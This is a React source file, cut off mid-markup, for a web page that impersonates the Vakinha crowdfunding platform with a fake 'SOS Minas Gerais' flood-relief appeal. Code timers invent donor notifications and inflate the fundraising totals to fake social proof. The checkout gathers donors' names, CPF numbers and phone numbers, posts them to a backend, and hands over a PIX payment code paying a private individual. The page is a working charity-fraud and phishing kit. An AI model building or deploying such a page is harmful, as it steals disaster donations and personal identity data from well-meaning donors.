import React, { useState, useEffect } from 'react';
import { Search, Heart, Share, ShieldCheck, Copy, Check, Menu, X, MessageCircle, Facebook, Twitter, Link as LinkIcon, ArrowLeft, Lock } from 'lucide-react';

const DONOR_NAMES = [
  'Henrique', 'Ana', 'Carlos', 'Mariana', 'João', 'Beatriz', 'Lucas', 'Fernanda', 
  'Pedro', 'Juliana', 'Rafael', 'Camila', 'Bruno', 'Amanda', 'Thiago', 'Letícia', 
  'Gabriel', 'Larissa', 'Rodrigo', 'Natália', 'Marcos', 'Aline', 'Felipe', 'Patrícia'
];

type DonationNotification = {
  id: number;
  name: string;
  amount: number;
};

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'payment'>('home');
  const [activeTab, setActiveTab] = useState('sobre');
  const [copiedPix, setCopiedPix] = useState(false);
  const [copiedLink, setCopiedLink] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [donationValue, setDonationValue] = useState('');
  const [notifications, setNotifications] = useState<DonationNotification[]>([]);
  const [totalRaised, setTotalRaised] = useState(613115.68);
  const [totalSupporters, setTotalSupporters] = useState(22731);
  const [totalHearts, setTotalHearts] = useState(5528);

  const GOAL_AMOUNT = 1000000;
  const progressPercent = Math.min((totalRaised / GOAL_AMOUNT) * 100, 100);

  useEffect(() => {
    let timeoutId: NodeJS.Timeout;

    const scheduleNext = (isFirst = false) => {
      // Primeira notificação aparece rápido (5 a 10 seg) para o usuário ver que funciona.
      // As próximas aparecem entre 1 e 5 minutos (60000 a 300000 ms) conforme solicitado.
      const delay = isFirst 
        ? Math.floor(Math.random() * 5000) + 5000 
        : Math.floor(Math.random() * (300000 - 60000 + 1)) + 60000;

      timeoutId = setTimeout(() => {
        const randomName = DONOR_NAMES[Math.floor(Math.random() * DONOR_NAMES.length)];
        const randomAmount = Math.floor(Math.random() * 50) + 1;
        
        const newNotif = { id: Date.now(), name: randomName, amount: randomAmount };
        
        setNotifications(prev => [...prev, newNotif]);
        setTotalRaised(prev => prev + randomAmount);
        setTotalSupporters(prev => prev + 1);
        setTotalHearts(prev => prev + Math.floor(Math.random() * 3) + 1);
        
        // Remove a notificação após 5 segundos
        setTimeout(() => {
          setNotifications(prev => prev.filter(n => n.id !== newNotif.id));
        }, 5000);

        scheduleNext(false);
      }, delay);
    };

    scheduleNext(true);

    return () => clearTimeout(timeoutId);
  }, []);

  const handleCopyPix = () => {
    navigator.clipboard.writeText('5965612@vakinha.com.br');
    setCopiedPix(true);
    setTimeout(() => setCopiedPix(false), 2000);
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(window.location.href);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  const handleQuickValue = (val: string) => {
    setDonationValue(val);
  };

  const notificationsUI = (
    <div className="fixed top-24 right-4 z-[100] flex flex-col gap-2 pointer-events-none">
      {notifications.map(notif => (
        <div 
          key={notif.id} 
          className="bg-green-500 text-white px-5 py-3 rounded-xl shadow-lg flex items-center gap-3 animate-in slide-in-from-top-8 fade-in duration-500"
        >
          <div className="bg-white/20 p-1.5 rounded-full">
            <Heart size={16} fill="currentColor" />
          </div>
          <p className="font-medium text-sm">
            <span className="font-bold">{notif.name}</span> doou <span className="font-bold">R$ {notif.amount},00</span>
          </p>
        </div>
      ))}
    </div>
  );

  if (currentPage === 'payment') {
    return (
      <>
        {notificationsUI}
        <PaymentPage onBack={() => setCurrentPage('home')} initialValue={donationValue} />
      </>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 font-sans text-gray-800 pb-12">
      {notificationsUI}
      {/* Header */}
      <header className="bg-white shadow-sm sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center">
            <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8" referrerPolicy="no-referrer" />
          </div>
          
          {/* Desktop Nav */}
          <nav className="hidden md:flex items-center gap-6 text-sm font-medium text-gray-700">
            <a href="#" className="hover:text-green-500 transition-colors">Início</a>
            <a href="#" className="hover:text-green-500 transition-colors">Como Funciona</a>
            <a href="#" className="hover:text-green-500 transition-colors">Explorar</a>
            <button className="flex items-center gap-1 text-gray-700 hover:text-green-500 transition-colors">
              Buscar <Search size={16} />
            </button>
          </nav>

          {/* Mobile Menu Toggle & Search */}
          <div className="md:hidden flex items-center gap-4">
            <button className="text-green-500 p-1">
              <Search size={24} />
            </button>
            <button className="p-1 text-gray-600" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X size={28} /> : <Menu size={28} />}
            </button>
          </div>
        </div>
        
        {/* Mobile Nav */}
        {mobileMenuOpen && (
          <div className="md:hidden bg-white border-t border-gray-100 p-4 flex flex-col gap-4 shadow-lg absolute w-full">
            <a href="#" className="text-gray-700 font-medium p-2 hover:bg-gray-50 rounded-lg">Início</a>
            <a href="#" className="text-gray-700 font-medium p-2 hover:bg-gray-50 rounded-lg">Como Funciona</a>
            <a href="#" className="text-gray-700 font-medium p-2 hover:bg-gray-50 rounded-lg">Explorar</a>
          </div>
        )}
      </header>

      {/* Main Content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 pb-32 lg:pb-8">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          
          {/* Left Column */}
          <div className="lg:col-span-2 space-y-6">
            {/* Hero Image */}
            <div className="relative rounded-2xl overflow-hidden aspect-[16/9] bg-gray-200 shadow-sm">
              <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="SOS Enchentes Minas Gerais" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
              {/* Texto sobreposto na imagem para simular a original */}
              <div className="absolute inset-0 bg-black/20 flex flex-col justify-center p-6">
                <h2 className="text-white font-black text-4xl leading-none tracking-tighter drop-shadow-lg">SOS<br/>ENCHENTES</h2>
                <p className="text-white font-bold tracking-widest text-sm mt-1 drop-shadow-md">MINAS GERAIS</p>
              </div>
            </div>

            {/* Title & Info */}
            <div className="bg-white p-4 sm:p-6 rounded-2xl shadow-sm border border-gray-100">
              <p className="text-[10px] font-bold text-gray-500 uppercase tracking-widest mb-2">TRAGÉDIAS / DESASTRES / ACIDENTES</p>
              <h1 className="text-2xl md:text-3xl font-bold text-[#002b49] mb-2 leading-tight">
                SOS Minas Gerais
              </h1>
              <p className="text-xs text-gray-800 font-medium mb-6">ID: 5965746</p>

              {/* Progress */}
              <div className="mb-4">
                <div className="h-1 bg-gray-200 rounded-full overflow-hidden mb-4">
                  <div className="h-full bg-[#00c853] rounded-full relative transition-all duration-1000 ease-out" style={{ width: `${progressPercent}%` }}>
                  </div>
                </div>
                <div className="flex items-baseline gap-2">
                  <h2 className="text-xl sm:text-2xl font-bold text-[#00c853] tracking-tight">
                    {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalRaised)}
                  </h2>
                  <p className="text-sm text-gray-500 font-medium">
                    de {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(GOAL_AMOUNT)}
                  </p>
                </div>
              </div>

              {/* Stats */}
              <div className="bg-[#eefcf1] rounded-xl p-4 mb-6 space-y-3">
                <div className="flex justify-between items-center text-xs">
                  <span className="text-gray-800 flex items-center gap-1.5">Corações Recebidos <Heart size={14} className="text-[#00c853]" fill="currentColor" /></span>
                  <span className="font-bold text-gray-900">{totalHearts}</span>
                </div>
                <div className="flex justify-between items-center text-xs">
                  <span className="text-gray-800">Apoiadores</span>
                  <span className="font-bold text-gray-900">{totalSupporters}</span>
                </div>
              </div>

              <p className="text-xs text-gray-600 leading-relaxed mb-6">
                SOS Minas Gerais: doe agora para vítimas das chuvas e deslizamentos. ATUALIZAÇÃO (27/02/2026, [11:40]): Minas Gerais enfrenta um ceário de EMERGÊNCIA após chuvas históricas. Segundo o Corpo de Bombeiros e a Defesa Civil, 58 óbitos já foram <a href="#" className="text-[#00c853] font-bold">ver tudo</a>
              </p>

              {/* Badges & Creator */}
              <div className="border-t border-gray-100 pt-6">
                <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between mb-4">
                  <div className="flex gap-2">
                    <div className="w-6 h-6 bg-red-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                    <div className="w-6 h-6 bg-green-600 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                    <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                    <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-[10px]"><ShieldCheck size={12} /></div>
                  </div>
                  <a href="#" className="text-xs font-bold text-gray-700 underline">Ver selos</a>
                </div>

                <div className="bg-gray-50 rounded-xl p-4 flex items-center gap-3">
                  <div className="w-10 h-10 bg-[#00c853] text-white rounded-full flex items-center justify-center font-bold text-xl shrink-0">
                    N
                  </div>
                  <div>
                    <p className="font-bold text-gray-900 text-sm flex items-center gap-1">Instituto Vakinha <Check size={14} className="text-white bg-[#00c853] rounded-full p-0.5" /></p>
                    <p className="text-[10px] text-gray-500 mt-0.5">Ativo(a) desde março/2023</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Mobile Donation Card (Visible only on mobile) */}
            <div className="lg:hidden bg-white rounded-2xl p-4 sm:p-6 shadow-sm border border-gray-100">
              {/* Donation Form */}
              <div className="mb-2">
                <h3 className="font-bold text-gray-900 mb-3 text-sm uppercase tracking-wide">Escolha um valor para doar</h3>
                <div className="grid grid-cols-2 gap-2 mb-3">
                  {['20', '50', '100', '200'].map(val => (
                    <button 
                      key={val} 
                      onClick={() => handleQuickValue(val)}
                      className={`py-2.5 border rounded-xl font-bold transition-colors ${
                        donationValue === val 
                          ? 'border-green-500 bg-green-50 text-green-700' 
                          : 'border-gray-200 text-gray-600 hover:border-green-500 hover:text-green-600'
                      }`}
                    >
                      R$ {val}
                    </button>
                  ))}
                </div>
                <div className="relative mb-4">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
                  <input 
                    type="number" 
                    placeholder="Outro valor" 
                    value={donationValue}
                    onChange={(e) => setDonationValue(e.target.value)}
                    className="w-full pl-12 pr-4 py-3.5 border border-gray-200 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors" 
                  />
                </div>
                <button onClick={() => setCurrentPage('payment')} className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl text-lg transition-colors shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 mb-4">
                  Doar Agora
                </button>
                <div className="flex items-center justify-center gap-1.5 text-xs font-medium text-gray-500 bg-gray-50 py-2 rounded-lg">
                  <ShieldCheck size={16} className="text-green-500" /> Pagamento seguro via PIX ou Cartão
                </div>
              </div>
            </div>

            {/* Tabs */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
              <div className="border-b border-gray-200 px-6 pt-2">
                <nav className="flex gap-8 overflow-x-auto">
                  {['Sobre', 'Sobre a ONG', 'Atualizações', 'Quem ajudou'].map(tab => (
                    <button
                      key={tab}
                      onClick={() => setActiveTab(tab.toLowerCase())}
                      className={`py-4 text-sm font-bold whitespace-nowrap border-b-2 transition-colors ${
                        activeTab === tab.toLowerCase() 
                          ? 'border-[#00c853] text-[#00c853]' 
                          : 'border-transparent text-gray-500 hover:text-gray-800 hover:border-gray-300'
                      }`}
                    >
                      {tab}
                    </button>
                  ))}
                </nav>
              </div>

              {/* Tab Content */}
              <div className="p-6">
                {activeTab === 'sobre' && (
                  <div className="space-y-6 text-gray-700 leading-relaxed text-sm">
                    <div className="prose max-w-none text-gray-800">
                      <p className="text-xs text-gray-600 mb-4">Vaquinha criada em: 24/02/2026</p>
                      
                      <h2 className="text-xl font-black text-gray-900 mb-4">SOS Minas Gerais: doe agora para vítimas das chuvas e deslizamentos.</h2>
                      
                      <p className="mb-4">
                        ATUALIZAÇÃO (27/02/2026, [11:40]): Minas Gerais enfrenta um ceário de EMERGÊNCIA após chuvas históricas. Segundo o Corpo de Bombeiros e a Defesa Civil, 58 óbitos já foram confirmados e mais de 4200 pessoas encontram-se desabrigadas. As cidades de Juiz de Fora e Ubá são as mais atingidas, com bairros inteiros soterrados e rios transbordados. Municípios como Matias Barbosa também sofrem com os impactos severos.
                      </p>

                      <p className="mb-6 flex items-start gap-2 bg-green-50 p-3 rounded-lg text-green-900 text-xs">
                        <Check size={16} className="text-green-600 shrink-0 mt-0.5" />
                        Esta é a vaquinha "SOS Minas Gerais" do Instituto Vakinha para levar ajuda emergencial aos afetados, com...
                      </p>

                      <h3 className="font-black text-gray-900 mb-2">OBJETIVO FINANCEIRO DA CAMPANHA:</h3>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>Valor: R$ 1.000.000,00</li>
                        <li><strong>Importante:</strong> A meta não é limitante, valores adicionais serão igualmente direcionados às organizações parceiras em benefício dos afetados.</li>
                      </ul>

                      <h3 className="font-black text-gray-900 mb-2">COMO SUA DOAÇÃO VIRA AJUDA?</h3>
                      <p className="mb-2">Sua contribuição financia itens essenciais para quem perdeu tudo:</p>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>Apoio logístico às equipes de resgate nas áreas afetadas;</li>
                        <li>Água potável, kits de higiene e limpeza;</li>
                        <li>Cestas básicas e refeições prontas (segurança alimentar);</li>
                        <li>Colchões, cobertores e roupas (ajuda emergencial);</li>
                        <li>Instalação de abrigos provisórios para pessoas e animais.</li>
                      </ul>

                      <h3 className="font-black text-gray-900 mb-2">POR QUE DOAR AGORA?</h3>
                      <p className="mb-6">Nas primeiras horas de uma tragédia, a velocidade salva vidas. Com o solo instável e o risco persistente, a necessidade de itens básicos cresce a cadadia.</p>

                      <h3 className="font-black text-gray-900 mb-2">TRANSPARÊNCIA:</h3>
                      <p className="mb-2">O Instituto Vakinha seleciona e acompanha organizações com idoneidade e capacidade local para execução no campo. Nesta campanha, vamos publicar:</p>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>1) Atualizações frequentes com data/hora;</li>
                        <li>2) Metas e marcos de arrecadação;</li>
                        <li>3) Descrição da destinação dos recursos;</li>
                        <li>4) Relatório consolidado ao final.</li>
                      </ul>

                      <h3 className="font-black text-gray-900 mb-2">COMO AJUDAR (EM 2 MINUTOS):</h3>
                      <ul className="list-disc pl-5 mb-6 space-y-1">
                        <li>1) Doe qualquer valor pela página (R$ 25 já ajuda);</li>
                        <li>2) Se preferir, doe via Pix:</li>
                      </ul>

                      <p className="mb-6 italic text-gray-600">Minas Gerais não pode esperar. Sua doação é o recomeço.</p>

                      <h3 className="font-black text-gray-900 mb-2 uppercase">Organizações parceiras na campanha:</h3>
                      <ul className="list-disc pl-5 mb-6 space-y-4">
                        <li><strong>OIM:</strong> A Agência da ONU para as Migrações (OIM) é a principal agência da Organização das Nações Unidas (ONU) dedicada a garantir que a migração ocorra de forma ordenada, humana e segura. Atuando em frentes que vão do apoio em crises humanitárias ao auxílio em políticas migratórias nacionais, ela trabalha diretamente com governos e migrantes para proteger os direitos de quem se desloca, promover o desenvolvimento socioeconômico através da mobilidade e enfrentar os desafios práticos da gestão migratória global.</li>
                        <li><strong>HUMUS:</strong> A HUMUS é uma organização brasileira do terceiro setor, sem fins lucrativos, especializada na gestão de desastres e na prestação de auxílio humanitário em situações de emergência extrema. Composta por profissionais técnicos e voluntários capacitados, a instituição atua de forma estratégica tanto na resposta imediata a catástrofes naturais — como inundações e deslizamentos — quanto na prevenção e mitigação de riscos, utilizando geotecnologias e treinamento especializado para salvar vidas e reconstruir a resiliência em comunidades vulneráveis.</li>
                        <li><strong>GRABH:</strong> O GRABH (Grupo de Resgate Animal de Belo Horizonte) é uma organização técnica especializada em medicina veterinária de desastres e salvamento animal em cenários críticos, como enchentes, inundações e incêndios florestais. Composto por médicos veterinários e bombeiros civis capacitados em resgate técnico, o grupo atua de forma estratégica na Zona da Mata em 2026, focando na retirada de animais ilhados, feridos ou presos em estruturas colapsadas, aplicando protocolos científicos de triagem e manejo — fundamentais para reduzir o sofrimento animal e prevenir riscos sanitários (como zoonoses) — garantindo que a fauna doméstica e silvestre receba atendimento especializado enquanto as equipes oficiais priorizam as vítimas humanas.</li>
                      </ul>
                    </div>
                  </div>
                )}
                
                {activeTab === 'atualizações' && (
                  <div className="space-y-6">
                    <div className="relative pl-6 border-l-2 border-green-500">
                      <div className="absolute w-3 h-3 bg-green-500 rounded-full -left-[7px] top-1.5 ring-4 ring-white"></div>
                      <p className="text-sm text-green-600 font-bold mb-1">25/02/2026</p>
                      <p className="text-gray-700 bg-gray-50 p-4 rounded-xl border border-gray-100">As primeiras doações já foram convertidas em cestas básicas e água potável, entregues nos abrigos temporários. Continuamos arrecadando para ajudar na reconstrução das casas. Muito obrigado a todos!</p>
                    </div>
                    <div className="relative pl-6 border-l-2 border-gray-200">
                      <div className="absolute w-3 h-3 bg-gray-300 rounded-full -left-[7px] top-1.5 ring-4 ring-white"></div>
                      <p className="text-sm text-gray-500 font-bold mb-1">24/02/2026</p>
                      <p className="text-gray-700 bg-gray-50 p-4 rounded-xl border border-gray-100">Iniciamos a campanha de arrecadação para as famílias atingidas pelas fortes chuvas em Juiz de Fora.</p>
                    </div>
                  </div>
                )}

                {activeTab === 'quem ajudou' && (
                  <div className="space-y-3">
                    {[
                      { name: 'Maria Silva', amount: 'R$ 50,00', time: 'Há 2 horas', msg: 'Força para todas as famílias!' },
                      { name: 'João Pedro', amount: 'R$ 20,00', time: 'Há 5 horas', msg: 'Deus abençoe Juiz de Fora.' },
                      { name: 'Anônimo', amount: 'R$ 100,00', time: 'Há 1 dia', msg: '' },
                      { name: 'Carlos E.', amount: 'R$ 30,00', time: 'Há 1 dia', msg: 'Estamos juntos nessa.' },
                    ].map((donor, i) => (
                      <div key={i} className="flex items-start justify-between p-4 bg-gray-50 rounded-xl border border-gray-100">
                        <div className="flex items-start gap-3">
                          <div className="w-10 h-10 bg-green-100 text-green-700 rounded-full flex items-center justify-center font-bold shrink-0">
                            {donor.name.charAt(0)}
                          </div>
                          <div>
                            <p className="font-bold text-gray-900">{donor.name}</p>
                            <p className="text-xs text-gray-500 mb-1">{donor.time}</p>
                            {donor.msg && <p className="text-sm text-gray-600 italic">"{donor.msg}"</p>}
                          </div>
                        </div>
                        <p className="font-bold text-green-600 bg-green-50 px-3 py-1 rounded-lg">{donor.amount}</p>
                      </div>
                    ))}
                    <button className="w-full py-3 text-green-600 font-bold hover:bg-green-50 rounded-xl transition-colors mt-4">
                      Ver todos os apoiadores
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Realização */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <h3 className="font-black text-gray-900 mb-4 uppercase text-sm">Realização</h3>
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-[#00c853] text-white rounded-full flex items-center justify-center font-bold text-2xl shrink-0">
                  N
                </div>
                <div>
                  <p className="font-bold text-gray-900 flex items-center gap-1">Instituto Vakinha <Check size={14} className="text-white bg-[#00c853] rounded-full p-0.5" /></p>
                  <p className="text-xs text-gray-500">Ativo(a) desde março/2023</p>
                </div>
              </div>
            </div>

            {/* FAQ */}
            <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-6">
              <h3 className="font-black text-gray-900 mb-4 uppercase text-sm">Tudo o que você precisa saber</h3>
              <div className="space-y-4">
                <div className="border-b border-gray-100 pb-4">
                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
                    Como o Vakinha funciona?
                    <span className="text-gray-400">+</span>
                  </button>
                </div>
                <div className="border-b border-gray-100 pb-4">
                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
                    É seguro doar pelo Vakinha?
                    <span className="text-gray-400">+</span>
                  </button>
                </div>
                <div className="pb-2">
                  <button className="w-full flex justify-between items-center text-left font-bold text-gray-900 text-sm">
                    Como posso ter certeza de que a campanha é verdadeira?
                    <span className="text-gray-400">+</span>
                  </button>
                </div>
              </div>
            </div>

            {/* Denunciar */}
            <div className="text-center">
              <button className="text-sm font-bold text-gray-500 hover:text-gray-700 underline">
                Denunciar
              </button>
            </div>
          </div>

          {/* Right Column (Sidebar) - Hidden on mobile, visible on desktop */}
          <div className="hidden lg:block lg:col-span-1" id="donation-card">
            <div className="bg-white rounded-2xl p-6 shadow-lg border border-gray-100 sticky top-24">
              
              {/* Progress */}
              <div className="mb-6">
                <div className="h-2.5 bg-gray-100 rounded-full overflow-hidden mb-4">
                  <div className="h-full bg-green-500 rounded-full relative transition-all duration-1000 ease-out" style={{ width: `${progressPercent}%` }}>
                    <div className="absolute right-0 top-0 bottom-0 w-4 bg-white/20 skew-x-12"></div>
                  </div>
                </div>
                <p className="text-sm font-bold text-gray-500 mb-1 uppercase tracking-wide">Arrecadado</p>
                <h2 className="text-4xl font-extrabold text-green-500 mb-1 tracking-tight">
                  {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(totalRaised)}
                </h2>
                <p className="text-sm text-gray-500 font-medium">
                  de {new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(GOAL_AMOUNT)}
                </p>
              </div>

              {/* Stats */}
              <div className="bg-green-50/50 rounded-xl p-4 mb-6 space-y-3 border border-green-100/50">
                <div className="flex justify-between items-center text-sm">
                  <span className="text-gray-600 flex items-center gap-1.5 font-medium">Corações Recebidos <Heart size={14} className="text-green-500" fill="currentColor" /></span>
                  <span className="font-bold text-gray-900 bg-white px-2 py-0.5 rounded shadow-sm">
                    {new Intl.NumberFormat('pt-BR').format(totalHearts)}
                  </span>
                </div>
                <div className="flex justify-between items-center text-sm">
                  <span className="text-gray-600 font-medium">Apoiadores</span>
                  <span className="font-bold text-gray-900 bg-white px-2 py-0.5 rounded shadow-sm">
                    {new Intl.NumberFormat('pt-BR').format(totalSupporters)}
                  </span>
                </div>
              </div>

              {/* Donation Form */}
              <div className="mb-6">
                <h3 className="font-bold text-gray-900 mb-3 text-sm uppercase tracking-wide">Escolha um valor para doar</h3>
                <div className="grid grid-cols-2 gap-2 mb-3">
                  {['20', '50', '100', '200'].map(val => (
                    <button 
                      key={val} 
                      onClick={() => handleQuickValue(val)}
                      className={`py-2.5 border rounded-xl font-bold transition-colors ${
                        donationValue === val 
                          ? 'border-green-500 bg-green-50 text-green-700' 
                          : 'border-gray-200 text-gray-600 hover:border-green-500 hover:text-green-600'
                      }`}
                    >
                      R$ {val}
                    </button>
                  ))}
                </div>
                <div className="relative mb-4">
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">R$</span>
                  <input 
                    type="number" 
                    placeholder="Outro valor" 
                    value={donationValue}
                    onChange={(e) => setDonationValue(e.target.value)}
                    className="w-full pl-12 pr-4 py-3.5 border border-gray-200 rounded-xl focus:ring-2 focus:ring-green-500 focus:border-green-500 outline-none font-bold text-gray-900 bg-gray-50 focus:bg-white transition-colors" 
                  />
                </div>
                <button onClick={() => setCurrentPage('payment')} className="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl text-lg transition-colors shadow-md hover:shadow-lg transform hover:-translate-y-0.5 duration-200 mb-4">
                  Doar Agora
                </button>
                <div className="flex items-center justify-center gap-1.5 text-xs font-medium text-gray-500 bg-gray-50 py-2 rounded-lg">
                  <ShieldCheck size={16} className="text-green-500" /> Pagamento seguro via PIX ou Cartão
                </div>
              </div>

              {/* Share */}
              <div className="mb-6">
                <div className="flex items-center gap-4 mb-4">
                  <div className="h-px bg-gray-200 flex-1"></div>
                  <span className="text-xs font-bold text-gray-400 uppercase tracking-wider">Compartilhe</span>
                  <div className="h-px bg-gray-200 flex-1"></div>
                </div>
                <div className="grid grid-cols-4 gap-2">
                  <button className="flex items-center justify-center p-3 bg-[#25D366] text-white rounded-xl hover:opacity-90 transition-opacity shadow-sm" title="WhatsApp">
                    <MessageCircle size={20} />
                  </button>
                  <button className="flex items-center justify-center p-3 bg-[#1877F2] text-white rounded-xl hover:opacity-90 transition-opacity shadow-sm" title="Facebook">
                    <Facebook size={20} />
                  </button>
                  <button className="flex items-center justify-center p-3 bg-[#1DA1F2] text-white rounded-xl hover:opacity-90 transition-opacity shadow-sm" title="Twitter">
                    <Twitter size={20} />
                  </button>
                  <button onClick={handleCopyLink} className="flex items-center justify-center p-3 bg-gray-100 text-gray-700 rounded-xl hover:bg-gray-200 transition-colors shadow-sm" title="Copiar Link">
                    {copiedLink ? <Check size={20} className="text-green-600" /> : <LinkIcon size={20} />}
                  </button>
                </div>
              </div>

              {/* Creator */}
              <div className="bg-gray-50 rounded-xl p-4 flex items-center gap-4 border border-gray-100">
                <div className="w-12 h-12 bg-blue-600 text-white rounded-full flex items-center justify-center font-bold text-lg shrink-0 shadow-sm">
                  GA
                </div>
                <div>
                  <p className="font-bold text-gray-900 leading-tight">Grupo de apoio</p>
                  <p className="text-xs text-gray-500 mt-0.5">📍 Juiz de Fora, MG</p>
                  <p className="text-xs text-gray-500 mt-0.5">📅 Ativo(a) desde fev/2026</p>
                </div>
              </div>

            </div>
          </div>

        </div>
      </main>

      {/* Fixed Bottom Bar for Mobile */}
      <div className="lg:hidden fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4 z-40 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.05)]">
        <button onClick={() => setCurrentPage('payment')} className="w-full bg-[#00c853] hover:bg-green-600 text-white font-bold py-3.5 rounded-xl text-lg transition-colors shadow-md">
          Doar Agora
        </button>
      </div>

      {/* Footer */}
      <footer className="bg-gray-900 text-gray-400 py-12 mt-12 border-t-4 border-green-500">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8">
            <div className="col-span-1 md:col-span-2">
              <div className="flex items-center mb-4">
                <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-8 brightness-0 invert" referrerPolicy="no-referrer" />
              </div>
              <p className="text-sm mb-4 max-w-sm leading-relaxed">A maior plataforma de doações do Brasil. Juntos podemos transformar vidas e fazer a diferença na vida de quem mais precisa.</p>
            </div>
            <div>
              <h3 className="text-white font-bold mb-4 uppercase tracking-wider text-sm">Sobre</h3>
              <ul className="space-y-3 text-sm">
                <li><a href="#" className="hover:text-green-400 transition-colors">Como funciona</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Taxas e prazos</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Dúvidas frequentes</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Contato</a></li>
              </ul>
            </div>
            <div>
              <h3 className="text-white font-bold mb-4 uppercase tracking-wider text-sm">Legal</h3>
              <ul className="space-y-3 text-sm">
                <li><a href="#" className="hover:text-green-400 transition-colors">Termos de uso</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Política de privacidade</a></li>
                <li><a href="#" className="hover:text-green-400 transition-colors">Transparência</a></li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-800 pt-8 flex flex-col md:flex-row items-center justify-between text-xs">
            <p>&copy; 2026 Vaquinha Solidária. Todos os direitos reservados.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}

function PaymentPage({ onBack, initialValue }: { onBack: () => void, initialValue: string }) {
  const [pixGenerated, setPixGenerated] = useState(false);
  const [value, setValue] = useState(initialValue);
  const [copied, setCopied] = useState(false);
  
  // Form state
  const [nome, setNome] = useState('');
  const [cpf, setCpf] = useState('');
  const [telefone, setTelefone] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText('00020101021126580014br.gov.bcb.pix013659152353-c62f-42d1-aaff-6c7538b71ae95204000053039865802BR5918PAULO R DA S SOUSA6008TRINDADE62070503***63045F6E');
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleGeneratePix = async () => {
    if (!nome || !cpf || !telefone || !value) return;
    
    setIsLoading(true);
    try {
      await fetch('/api/cadastro', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ nome, cpf, telefone, valor: value }),
      });
    } catch (error) {
      console.error('Erro ao salvar cadastro', error);
    } finally {
      setIsLoading(false);
      setPixGenerated(true);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center font-sans text-gray-800 pb-12">
      {/* Header Fixo Checkout */}
      <header className="bg-white shadow-sm sticky top-0 z-50 w-full">
        <div className="max-w-md mx-auto px-4 h-16 flex items-center justify-between">
          <button onClick={onBack} className="p-2 -ml-2 text-gray-600 hover:bg-gray-100 rounded-full transition-colors">
            <ArrowLeft size={24} />
          </button>
          <img src="https://seeklogo.com/images/V/vakinha-logo-88066E3580-seeklogo.com.png" alt="Vakinha Logo" className="h-7" referrerPolicy="no-referrer" />
          <div className="w-10"></div> {/* Spacer para centralizar a logo */}
        </div>
      </header>

      <div className="w-full max-w-md px-4 mt-6">
        {/* Info da Campanha */}
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 p-4 mb-6 flex items-center gap-4">
          <img src="https://midias.em.com.br/_midias/jpg/2026/02/24/1200x720/1_juiz-de-fora-cemig-desmente-que-havera-interrupcao-geral-de-energia-64640530.jpeg?20260224185555?20260224185555" alt="Campanha" className="w-16 h-16 rounded-xl object-cover" referrerPolicy="no-referrer" />
          <div>
